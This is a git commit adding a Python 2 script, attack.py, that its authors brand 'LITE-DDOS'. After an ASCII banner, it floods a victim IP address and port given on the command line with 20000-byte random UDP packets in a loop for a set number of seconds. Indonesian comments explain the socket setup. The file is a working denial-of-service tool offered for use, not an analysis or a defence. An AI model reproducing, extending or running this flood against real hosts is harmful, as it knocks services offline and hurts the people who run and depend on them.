449e26c9bb0559118a0ce9a15702432d86ae8a6b
MR.3 <59309485+Mamang-hack@users.noreply.github.com>
2020-01-31 23:16:49 +0700

    attack.py

---
+++ attack.py
@@ -0,0 +1,47 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;32m#########################################################"
+    print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
+    print "#-------------------------------------------------------#"
+    print "#   \033[1;91mCommand: " "python2 attack.py " "<ip> <port> <packet> \033[1;32m   #"
+    print "#                                                       #"
+    print "#\033[1;91mCreator:MR.3  \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mTeam   : GHC        \033[1;32m##     #          ##                #"
+    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
+    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
+    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
+    print "#               \033[1;91m<--[Giessen Hawk Cyber]-->         \033[1;32m#"
+    print "#########################################################"
+    print "                        @@@@@@@@@@"
+    print "                       @@@@@@@@@@@@"
+    print "                     @@@@@@@@@@@@@@@@"
+def flood(victim, vport, duration):
+    # assalamualaikum mamang's :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mStart \033[1;32m%s \033[1;91msend paket \033[1;32m%s \033[1;91mto port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
